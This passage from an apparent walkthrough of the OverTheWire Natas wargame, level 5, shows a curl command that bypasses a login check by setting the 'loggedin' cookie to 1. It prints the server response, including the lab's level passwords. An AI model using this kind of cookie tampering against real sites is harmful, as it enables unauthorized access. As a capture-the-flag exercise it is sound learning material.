***Access disallowed. You are not logged in***

Looking again at the inspector utility within the browser, it appears there is a Request Cookie `loggedin` set to 0. Is it really as simple as changing that to a 1?

Let's use another `curl` call:

**`raj@arch:~$ curl -u natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD --cookie loggedin=1 natas5.natas.labs.overthewire.org`**  
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>
</body>
</html>
```
